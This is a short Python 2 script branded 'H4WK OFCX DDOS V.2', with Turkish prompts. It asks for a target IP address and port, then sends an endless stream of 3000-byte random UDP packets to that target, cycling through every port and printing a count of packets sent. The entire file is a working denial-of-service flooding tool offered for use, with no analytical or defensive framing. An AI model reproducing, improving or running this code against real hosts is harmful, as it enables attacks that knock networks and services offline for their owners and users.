#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3000)
os.system("clear")
banner = """
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     H4WK OFCX DDOS V.2

>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"""
print(banner)
ip = raw_input("Hedef İp => ")
port = input("Hedef Port => ")
os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "------------------------------------------------------------------------------------"
     print " Gönderilen Paket => %s \n İp Adres =>  %s \n Bağlantı => :%s"%(sent,ip,port)
     print "------------------------------------------------------------------------------------"
     if port == 65534:
        port = 1
